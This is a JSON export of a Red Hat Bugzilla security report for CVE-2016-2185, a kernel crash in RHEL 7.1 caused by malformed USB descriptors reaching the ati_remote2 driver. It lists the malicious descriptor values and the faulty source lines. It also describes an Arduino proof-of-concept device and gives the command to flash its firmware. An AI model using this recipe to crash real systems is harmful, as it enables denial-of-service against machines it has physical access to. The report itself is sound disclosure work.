{
    "bugid": "1283363",
    "cveid": [
        "CVE-2016-2185"
    ],
    "summary": "CVE-2016-2185 Local RedHat Enterprise Linux DoS \u2013 RHEL 7.1 Kernel crashes on invalid  USB device descriptors (ati_remote2 driver bug2) [local-DoS]",
    "alias": "None",
    "product": "Red Hat Enterprise Linux 7",
    "hardware": "Unspecified",
    "os": "Unspecified",
    "url": "",
    "reported_date": "2015-11-18 19:51 UTC byRalf Spenneberg",
    "attachment": [
        "https://bugzilla-attachments.redhat.com/attachment.cgi?id=1096262",
        "https://bugzilla-attachments.redhat.com/attachment.cgi?id=1096263",
        "https://bugzilla-attachments.redhat.com/attachment.cgi?id=1096264",
        "https://bugzilla-attachments.redhat.com/attachment.cgi?id=1096265"
    ],
    "comment": [
        "Description of problem:\nLocal RedHat Enterprise Linux DoS \u2013 RHEL 7.1 Kernel crashes on invalid \nUSB device descriptors (ati_remote2 driverbug2) [local-DoS]\n\nVersion-Release number of selected component (if applicable):\nKernel-Version: 3.10.0-229.20.1.el7.x86_64 \n\nHow reproducible:\nalways\n\n\nOpenSource Security Ralf Spenneberg\nAm Bahnhof 3-5\n48565 Steinfurt\ninfo\n\n\nDate: November 12th, 2015\nAuthors: Sergej Schumilo, Hendrik Schwartke, Ralf Spenneberg\nCVE: not yet assigned\nCVSS: 4.9 (AV:L/AC:L/Au:N/C:N/I:N/A:C) \nTitle: Local RedHat Enterprise Linux DoS \u2013 RHEL 7.1 Kernel crashes on invalid \nUSB device descriptors (ati_remote2 driver) [local-DoS]\nSeverity: Critical. The Kernel panics. A reboot is required.\nEase of Exploitation: Trivial\nVulnerability type: Wrong input validation\nProducts: RHEL 7.1 including all updates\nKernel-Version: 3.10.0-229.20.1.el7.x86_64 \n(for debugging-purposes we used the CentOS Kernel kernel-debuginfo-3.10.0-229.14.1.el7)\n\n\nAbstract\nThe Kernel 3.10.0-229.20.1.el7.x86_64 crashes when presented a buggy USB \ndevice which requires the ati_remote2 driver.\nDetailed product description\nWe confirmed the bug on the following system:\nRHEL 7.1\nKernel = 3.10.0-229.20.1.el7.x86_64\nFurther products or kernel versions have not been tested.\nHow reproducible: Always\nActual results: Kernel crashes \n\nDescription:\nThe bug was found using the USB-fuzzing framework vUSBf from Sergej Schumilo \n(github.com/schumilo) using the following device descriptor:\n\n ######### PAYLOAD 1 #########\n[*] Device-Descriptor\n  bLength:\t\t0x12\n  bDescriptorType:\t0x1\n  bcdUSB:\t\t0x200\n  bDeviceClass:\t\t0xff\n  bDeviceSubClass:\t0x0\n  bDeviceProtocol:\t0x0\n  bMaxPacketSize:\t0x40\n  idVendor:\t\t0x471\n  idProduct:\t\t0x602\n  bcdDevice:\t\t0x100\n  iManufacturer:\t0x1\n  iProduct:\t\t0x2\n  iSerialNumbers:\t0x3\n  bNumConfigurations:\t0x1\n\nThis is the configuration descriptor containing two interface-descriptors.\nThe ati_remote2 driver assumes that there will be at least two interface-descriptors with associated endpoint-descriptors. \nIf one of them contains a zero-value for bNumEndpoints or no endpoint-descriptor is configured for the corresponding interface-descriptor, the ati_remote2 driver tries to dereference a null-pointer and the kernel crashes:\n\n****\n$ nm ati_remote2.ko.debug | grep ati_remote2_probe\n0000000000001300 t ati_remote2_probe\n$ addr2line -e ati_remote2.ko.debug 13ff\n/usr/src/debug/kernel-3.10.0-229.14.1.el7/linux-3.10.0-229.14.1.el7.x86_64/drivers/input/misc/ati_remote2.c:646\n****\n\n**** CentOS-Kernel linux-3.10.0-229.14.1.el7 (drivers/input/misc/ati_remote2.c)\n        ...\n632\tstatic int ati_remote2_urb_init(struct ati_remote2 *ar2)\n633\t{\n        ...\n646\tpipe = usb_rcvintpipe(udev, ar2->ep[i]->bEndpointAddress); /* null-pointer derference */\n647\tmaxp = usb_maxpacket(udev, pipe, usb_pipeout(pipe));\n        ...\n820\tar2->intf[0] = interface;             \n821\tar2->ep[0] = &alt->endpoint[0].desc;   /* <-- possible null-pointer (interface-0) */\n822\n823\tar2->intf[1] = usb_ifnum_to_if(udev, 1);\n824\tr = usb_driver_claim_interface(&ati_remote2_driver, ar2->intf[1], ar2); \n825\tif (r)\n826\t\tgoto fail1;\n827\talt = ar2->intf[1]->cur_altsetting;\n828     ar2->ep[1] = &alt->endpoint[0].desc;   /* <-- possible null-pointer (interface-1) */\n        ...\n****\n\n\t[*] Configuration-Descriptor\n\t  bLength:\t\t0x9\n\t  bDescriptorType:\t0x2\n\t  wTotalLength:\t\t0x27\n\t  bNumInterfaces:\t0x1\n\t  bConfigurationValue:\t0x1\n\t  iConfiguration:\t0x0\n\t  bmAttributes:\t\t0x0\n\t  bMaxPower:\t\t0x31\n\t\t[*] Interface-Descriptor\n\t\t  bLength:\t\t0x9\n\t\t  bDescriptorType:\t0x4\n\t\t  bInterfaceNumber:\t0x0\n\t\t  bAlternateSetting:\t0x0   \n\t\t  bNumEndpoints:\t0x0    <-- malicious value for interface-0\n\t\t  bInterfaceClass:\t0x0\n\t\t  bInterfaceSubClass:\t0x0\n\t\t  bInterfaceProtocol:\t0x0\n                       [*] Endpoint-Descriptor\n\t\t\t  bLength:\t\t0x7\n\t\t\t  bDescriptorType:\t0x5\n\t\t\t  bEndpointAddress:\t0x81\n\t\t\t  bmAttribut:\t\t0x3\n\t\t\t  wMaxPacketSize:\t0x404\n\t\t\t  bInterval:\t\t0xc\n\t\t[*] Interface-Descriptor\n\t  \t  bLength:\t\t0x9\n\t\t  bDescriptorType:\t0x4\n\t\t  bInterfaceNumber:\t0x0\n\t\t  bAlternateSetting:\t0x0\n\t\t  bNumEndpoints:\t0x0    <-- malicious value for interface-1\n\t\t  bInterfaceClass:\t0x0\n\t\t  bInterfaceSubClass:\t0x0\n\t\t  bInterfaceProtocol:\t0x0\n                       [*] Endpoint-Descriptor\n\t\t\t  bLength:\t\t0x7\n\t\t\t  bDescriptorType:\t0x5\n\t\t\t  bEndpointAddress:\t0x81\n\t\t\t  bmAttribut:\t\t0x3\n\t\t\t  wMaxPacketSize:\t0x404\n\t\t\t  bInterval:\t\t0xc\n\nProof of Concept:\n1) The bug can be reproduced using USB-fuzzing framework vUSBf from Sergej Schumilo (github.com/schumilo). \nThe attached vUSBf-obj file contains the payload. Please let us know if you would like to use the Facedancer board. \nIn such case, we could also provide a patched version of vUSBf which allows to reproduce vUSBf-Payloads using the Facedancer board.\n2) For a proof of concept we are providing also an Arduino firmware file. Just flash it \non Arduino Leonardo and plug it into any RHEL machine. The Arduino will \nemulate the defective USB device.\n\n   avrdude -v -p ATMEGA32u4 -c avr109 -P /dev/ttyACM0 -b 57600 -U flash:w:binary.hex\n\nThe file binary.hex has been attached to this bug report.\nTo prevent automated sending of payloads, use a jumper to connect port D3 and \n5V!\n\n\nSeverity and Ease of Exploitation\nThe security weakness can be easily exploited. Using our Arduino firmware only \nphysical access to the system is required. \n\nAdditional info:\nStacktrace, vUSBf-Payload, additional vUSBf-Descriptorfile and Arduino-Firmware attached.\n\nPlease assign a CVE for this issue since this is a local DoS of the targeted system. \nCVSS 4.9 (AV:L/AC:L/Au:N/C:N/I:N/A:C)",
        "Createdattachment 1096262[details]vUSBf Payload\n\nThe following attachments represents the case that both interface-descriptors contain malicious values. Thus, the kernel crashes at the first nullpointer-dereference. Please let us know if you need corresponding attachments to reproduce also the second nullpointer-dereference.\n\n#### vUSBf-Payload:\nThis vUSBf-Payload requires a file named ati_remote2_bug2.txt located in vUSBf/dev_desc. This file is also attached to this bug-report (* see vUSBf-Descriptorfile *).",
        "Createdattachment 1096263[details]Modified vUSBf descriptor file",
        "Createdattachment 1096264[details]Stacktrace",
        "Createdattachment 1096265[details]Arduino firmware demonstrating the bug",
        "CVE-2016-2185which is Red Hat's private CVE ID was assigned to this security flaw. Please, use it in the public communications regarding this flaw, thank you.",
        "public via:http://seclists.org/bugtraq/2016/Mar/90",
        "patch posted upstream (linux-usb@ and linux-input@ lists):http://marc.info/?l=linux-usb&m=145874840924378&w=2|http://article.gmane.org/gmane.linux.usb.general/139169|http://www.spinics.net/lists/linux-usb/msg138107.htmlhttp://marc.info/?l=linux-input&m=145874841024379&w=2|http://www.spinics.net/lists/linux-input/msg43818.html",
        "Thank you for reporting this flaw. The Product Security has rated this flaw as having low security impact (bz#1317014), so the patch is currently not planned to be added to the RHEL source trees. If accepted to the upstream, the patch may get to the RHEL trees later at the next USB subsystem code rebase."
    ]
}